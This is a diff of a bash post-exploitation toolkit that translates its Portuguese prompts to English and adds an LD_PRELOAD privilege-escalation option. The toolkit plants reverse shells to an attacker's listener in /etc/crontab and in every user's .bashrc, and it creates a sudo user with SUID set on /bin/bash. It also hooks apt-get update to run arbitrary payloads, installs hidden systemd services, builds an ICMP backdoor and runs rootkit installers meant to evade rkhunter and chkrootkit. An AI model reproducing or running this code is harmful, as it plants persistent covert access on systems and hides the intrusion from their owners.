@@ -12,75 +12,75 @@ requirements() {
 crontab() {
     rainbow " [*] Crontab Persistence [*] "
     echo -e "\n"
-    rainbow "Deseja inserir um comando personalizado na crontab?"
-    rainbow "Digite 'sim' para inserir um comando personalizado ou 'nao' para executar o comando padrão."
+    rainbow "Want to insert a custom command into crontab?"
+    rainbow "Enter 'yes' to enter a custom command or 'no' to run the default command."
     read resposta
 
-    if [[ $resposta == "sim" ]]; then
-      rainbow "Digite o comando que deseja adicionar à crontab:"
+    if [[ $resposta == "yes" ]]; then
+      rainbow "Enter the command you want to add to the crontab: "
       read comando
     else
-      rainbow "Digite o endereço IP:"
+      rainbow "Enter the IP address: "
       read ip
 
-      rainbow "Digite a porta:"
+      rainbow "Enter port: "
       read porta
 
       comando="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$porta 0>&1'"
     fi
 
-    rainbow "Adicionando o comando à crontab..."
+    rainbow "Adding command to crontab..."
     echo "* * * * * root $comando" | sudo tee -a /etc/crontab > /dev/null
-    rainbow "Comando adicionado com sucesso!"
+    rainbow "Command successfully added!"
 }
 
 bashRCPersistence() {
     rainbow " [*] .bashrc Persistence [*] "
     echo -e "\n"
 
-      rainbow "Digite o endereço IP do seu listener:"
+      rainbow "Enter your listener's IP address: "
       read ip
 
-      rainbow "Digite o número da porta do seu listener:"
+      rainbow "Enter the port number of your listener: "
       read porta
 
       payload="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$porta 0>&1'"
 
       for usuario in /home/*; do
         if [ -d "$usuario" ]; then
-          rainbow "Inserindo a payload de reverse shell no .bashrc de $usuario..."
+          rainbow "Inserting the reverse shell payload in the .bashrc of $user..."
           rainbow "$payload" >> "$usuario/.bashrc"
-          rainbow "Payload inserida com sucesso em $usuario/.bashrc"
+          rainbow "Payload successfully inserted into $usuario/.bashrc"
         fi
       done
-    rainbow ".bashrc persistence setupado com sucesso!!"
+    rainbow ".bashrc persistence setup successfully!!"
 }
 
 userANDBashSUID() {
-    rainbow " [*] Usuário Privilegiado & SUID /bin/bash [*] "
+    rainbow " [*] Privileged User & SUID /bin/bash [*] "
     echo -e "\n"
 
-    rainbow "Digite um nome para o usuario: "
+    rainbow "Enter a name for the user: "
     read user
 
     adduser $user
     usermod -aG sudo $user
     chmod u+s /bin/bash
 
-    rainbow "Usuário $username criado com permissões de root e SUID setado no /bin/bash"
+    rainbow "User $username created with root permissions and SUID set in /bin/bash"
 }
 
 apthooking() {
-    rainbow " [ * ]  hookando o comando apt-get update [ * ] "
+    rainbow " [ * ]  hooking the apt-get update command [ * ] "
     echo -e "\n"
 
-    rainbow "Digite um payload ou comando, assim que o usuario digitar sudo apt-get update, este comando que voce colocar a seguir, será executado!"
+    rainbow "Enter a payload or command, as soon as the user enters sudo apt-get update, this command that you enter below will be executed!"
     read command
 
     sudo touch /etc/apt/apt.conf.d/1aptget
     echo "APT::Update::Pre-Invoke {\"$command\";};" | sudo tee /etc/apt/apt.conf.d/1aptget > /dev/null
 
-    rainbow "Seu hook está em /etc/apt/apt.conf.d/1aptget com o comando: $command"
+    rainbow "Your hook is in /etc/apt/apt.conf.d/1aptget with the command: $command"
 }
 
 systemdUser() {
@@ -88,20 +88,20 @@ systemdUser() {
 
     echo -e "\n"
 
-      rainbow "Deseja executar um script? (s/n): "
+      rainbow "Do you want to run a script? (Y/n): "
       read execute_script
 
-    if [[ $execute_script == "s" ]]; then
-      rainbow "Digite o caminho completo do script: "
+    if [[ $execute_script == "Y" ]]; then
+      rainbow "Enter the full path of the script: "
       read script_path
     else
-      rainbow "Digite o comando a ser executado no ExecStart: "
+      rainbow "Type the command to run in ExecStart: "
       read exec_command
     fi
 
     cat > ~/.config/systemd/user/hidden.service <<EOF
 [Unit]
-Description=Meu serviço de exemplo
+Description=My service
 
 [Service]
 ExecStart=${script_path:-$exec_command}
@@ -112,8 +112,8 @@ RestartSec=60
 WantedBy=default.target
 EOF
 
-    if [[ $execute_script == "s" && ! -x $script_path ]]; then
-      rainbow "Erro: O script especificado não tem permissão de execução."
+    if [[ $execute_script == "Y" && ! -x $script_path ]]; then
+      rainbow "Error: The specified script does not have execute permission."
     else
       systemctl --user daemon-reload
 
@@ -121,27 +121,27 @@ EOF
       systemctl --user start hidden.service
     fi
 
-    rainbow "Systemd Persistence em user level setupado com sucesso!!"
+    rainbow "Systemd Persistence at user level setup successfully!!"
 }
 systemdRoot() {
     rainbow "[ * ] Systemd root level [ * ] "
 
     echo -e "\n"
 
-    rainbow "Deseja executar um script? (s/n): "
+    rainbow "Do you want to run a script? (Y/n): "
     read execute_script
 
-    if [[ $execute_script == "s" ]]; then
-      rainbow "Digite o caminho completo do script: "
+    if [[ $execute_script == "Y" ]]; then
+      rainbow "Enter the full path of the script: "
       read script_path
     else
-      rainbow "Digite o comando a ser executado no ExecStart: "
+      rainbow "Type the command to run in ExecStart: "
       read exec_command
     fi
 
     cat > /etc/systemd/system/hidden2.service <<EOF
 [Unit]
-Description=Meu serviço de exemplo
+Description=My service
 
 [Service]
 ExecStart=${script_path:-$exec_command}
@@ -152,25 +152,25 @@ RestartSec=60
 WantedBy=default.target
 EOF
 
-    if [[ $execute_script == "s" && ! -x $script_path ]]; then
-      rainbow "Error: O script especificado não tem permissão de execução."
+    if [[ $execute_script == "Y" && ! -x $script_path ]]; then
+      rainbow "Error: The specified script does not have execute permission."
     else
       systemctl daemon-reload
 
       systemctl enable hidden2.service
       systemctl start hidden2.service
 
-      rainbow "Systemd Root level setupado com sucesso!"
+      rainbow "Systemd Root level setup successfully!"
     fi
 }
 
 sshGen() {
     while IFS=':' read -r username password uid gid full_name home shell; do
         if [[ "$shell" =~ /bin/.* ]] && [[ "$home" =~ ^/home/[^/]+$ ]]; then
-            rainbow "Usuário $username possui shell $shell"
+            rainbow "User $username has shell $shell"
 
             if [ ! -f "$home/.ssh/id_rsa.pub" ]; then
-                rainbow "Gerando ssh-key para o usuário $username"
+                rainbow "Generating ssh-key for user $username"
 
                 sleep 5
 
@@ -184,14 +184,14 @@ sshGen() {
 
                 clear
             else
-                rainbow "Chave SSH já existe para o usuário $username"
+                rainbow "SSH key already exists for user $username"
             fi
         fi
     done < "/etc/passwd"
 
     sleep 3
 
-    rainbow "SSH-KEY geradas para todos os usuários válidos com sucesso!! XDXD"
+    rainbow "SSH-KEY successfully generated for all valid users!!"
 }
 
 lkmRootkitmodified() {
@@ -200,19 +200,24 @@ lkmRootkitmodified() {
 }
 
 icmpBackdoor() {
-  rainbow "Digite o endereço IP que irá receber o ping: "
+  rainbow "Enter the IP address that will receive the ping: "
   read LHOST
-  rainbow "Digite o número da porta que irá receber a conexão: "
+  rainbow "Enter the port number that will receive the connection: "
   read LPORT
   git clone https://github.com/MrEmpy/Pingoor
   cd Pingoor
   make HOST=$LHOST PORT=$LPORT
-  rainbow "Backdoor compilado. Você pode encontra-lo em Pingoor/pingoor"
+  rainbow "Backdoor compiled. You can find it at Pingoor/pingoor"
 }
 
 lkmRootkit(){
   chmod +x install_locutus.sh
   ./install_locutus.sh
+}
+
+SetupLdPreloadPrivesc(){
+  chmod +x ld.sh
+  ./ld.sh
 }
 
 banner() {
@@ -248,6 +253,7 @@ menu() {
   [03] Crontab Persistence        [08] LKM Rootkit Modified, Bypassing rkhunter & chkrootkit
   [04] Systemd User level         [09] ICMP Backdoor
   [05] Systemd Root Level         [10] LKM Rootkit
+                                  [11] Setup privesc LD_PRELOAD
 
     [*] Coming soon others features [*]
 
@@ -277,8 +283,10 @@ EOF
         icmpBackdoor
     elif [ "$MENUINPUT" == "10" ] || [ "$MENUINPUT" == "10" ]; then
         lkmRootkit
+    elif [ "$MENUINPUT" == "11" ] || [ "$MENUINPUT" == "11" ]; then
+        SetupLdPreloadPrivesc
     else 
-        echo "Essa opção não existe"
+        echo "This option does not exist"
     fi
 }
 
